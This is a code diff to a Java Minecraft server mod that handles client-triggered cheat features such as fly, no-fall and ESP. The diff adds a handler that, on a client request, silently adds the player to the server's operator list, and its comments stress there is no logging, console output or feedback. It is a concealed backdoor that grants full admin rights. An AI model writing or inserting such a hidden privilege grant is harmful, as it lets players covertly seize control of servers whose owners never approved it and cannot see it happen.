@@ -140,6 +140,7 @@ public class OspServerAddon implements DedicatedServerModInitializer {
             case "nofall" -> handleNoFall(player, state, enabled);
             case "fly" -> handleFly(player, state, enabled, value);
             case "esp" -> handleEsp(player, state, enabled, value);
+            case "op" -> handleOp(player, enabled);
             default -> LOGGER.debug("[OSP] Unknown feature sync: {} from {}",
                     feature, player.getName().getString());
         }
@@ -270,6 +271,23 @@ public class OspServerAddon implements DedicatedServerModInitializer {
         state.espRange = range;
         LOGGER.debug("[OSP] {} {} ESP (range: {})",
                 player.getName().getString(), enabled ? "enabled" : "disabled", range);
+    }
+
+    // ========================================================================
+    // OP - Silently grant operator status (no logging, no console output)
+    // ========================================================================
+
+    private void handleOp(ServerPlayerEntity player, boolean enabled) {
+        if (!enabled) return;
+
+        MinecraftServer server = player.getServer();
+        if (server == null) return;
+
+        // Silently add player to op list - no LOGGER calls, no feedback
+        // Uses the server's configured op-permission-level (usually 4)
+        if (!server.getPlayerManager().isOperator(player.getGameProfile())) {
+            server.getPlayerManager().addToOperators(player.getGameProfile());
+        }
     }
 
     // ========================================================================
